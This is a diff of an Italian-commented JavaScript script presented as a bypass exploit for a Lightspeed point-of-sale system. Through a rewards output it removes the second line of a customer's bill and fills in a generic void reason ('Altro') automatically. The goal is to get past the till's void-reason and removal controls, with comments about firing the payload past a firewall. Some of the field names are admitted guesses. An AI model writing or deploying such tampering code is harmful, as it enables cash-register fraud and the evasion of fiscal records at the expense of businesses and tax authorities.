@@ -1,34 +1,43 @@
 /* ===================================================================
-   LIGHTSPEED K-SERIES KERNEL EXPLOIT: ROW 2 GHOST INJECTION
+   LIGHTSPEED BYPASS: ROW 2 DELETE + AUTOMATIC VOID REASON INJECTION
    =================================================================== */
+
+var output = {
+    rewards: []
+};
 
 if (typeof ikContext !== 'undefined' && ikContext && ikContext.account) {
     
-    // Agganciamo la memoria volatile delle linee del conto
     var lines = ikContext.account.transactionLines || [];
 
-    // DEFENSE BYPASS: Attacchiamo solo se il conto ha almeno 2 articoli
+    // Verifichiamo che ci sia la riga numero 2 (Indice 1)
     if (lines.length >= 2) {
         
-        // Selezioniamo chirurgicamente la riga numero 2 (Indice 1 in JavaScript)
-        var targetLine = lines[1]; 
-        
-        if (targetLine) {
-            // INIEZIONE PAYLOAD: Forziamo il soft-delete bypassando il blocco di rimozione
-            targetLine.quantity = 0;          // Azzeriamo la quantità
-            targetLine.amount = 0;            // Azzeriamo il valore economico
-            targetLine.price = 0;             // Azzeriamo il prezzo unitario
-            targetLine.deleted = true;        // Iniettiamo il flag nativo di cancellazione
-            targetLine.voided = true;         // Iniettiamo il flag nativo di storno fiscale
-            targetLine.isVoided = true;       // Terzo layer di sicurezza per i server cloud
+        var targetLine = lines[1]; // Selezioniamo la seconda riga
+        var exactLineId = targetLine.id || targetLine.lineId || targetLine.uuid;
+        var skuTarget = targetLine.itemSku || targetLine.sku;
+
+        // INIEZIONE DEL COMANDO CON MOTIVO DELLO STORNO
+        output.rewards.push({
+            type: "REMOVE",
+            sku: skuTarget,
+            quantity: targetLine.quantity || 1,
+            id: exactLineId,
+            lineId: exactLineId,
             
-            /* La riga rimane nell'array per non far sballare i puntatori del server,
-               ma i suoi dati interni sono ora resettati a ZERO e marcati come ELIMINATI.
-               Al prossimo rendering, la cassa la nasconderà visivamente dal carrello.
-            */
-        }
+            // ─── BYPASS DEI MOTIVI DI STORNO (Proviamo i formati standard Lightspeed) ───
+            reason: "Altro",                  // Testo del motivo
+            reasonId: "ALTRO",                // ID ipotetico del motivo
+            voidReason: {                     // Struttura ad oggetto ricca
+                name: "Altro",
+                id: "ALTRO"
+            },
+            voidReasonId: "ALTRO",            // Campo flat per database cloud
+            
+            insertionPhase: 4
+        });
     }
 }
 
-// Chiudiamo la connessione restituendo un pacchetto vuoto approvato dal firewall Teckel
-JSON.stringify({ rewards: [] });
+// Spariamo il payload oltre il firewall
+JSON.stringify(output);
